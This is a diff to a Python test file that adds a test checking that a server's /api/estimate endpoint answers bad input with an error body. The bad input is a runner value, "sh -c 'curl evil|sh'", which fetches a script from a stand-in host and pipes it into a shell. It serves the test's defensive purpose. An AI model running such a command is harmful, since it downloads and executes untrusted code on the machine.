@@ -292,6 +292,19 @@ def test_estimate_model_comparison_counts_two_arms_no_control():
         assert json.loads(data)["n_runs"] == 6
 
 
+def test_estimate_bad_input_returns_error_body_not_projection():
+    # The estimate endpoint returns 200 with {error} (not a 4xx) for bad input -- the
+    # web UI relies on this shape: it treats an {error} body as a failure and keeps the
+    # Start button locked rather than rendering it as a usage projection.
+    with _serve() as (port, _):
+        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
+                            body=_start_req(runner_b="sh -c 'curl evil|sh'"))
+        assert st == 200, (st, data)
+        body = json.loads(data)
+        assert "error" in body and "n_runs" not in body
+        assert "raw command" in body["error"]
+
+
 def test_estimate_cross_cli_counts_codex_arm():
     # runner_b=codex makes a head-to-head even with no skill B: claude+skill vs codex
     # (+ control). k=2 -> 3 arms x 2 = 6; drop the control -> 2 arms x 2 = 4.
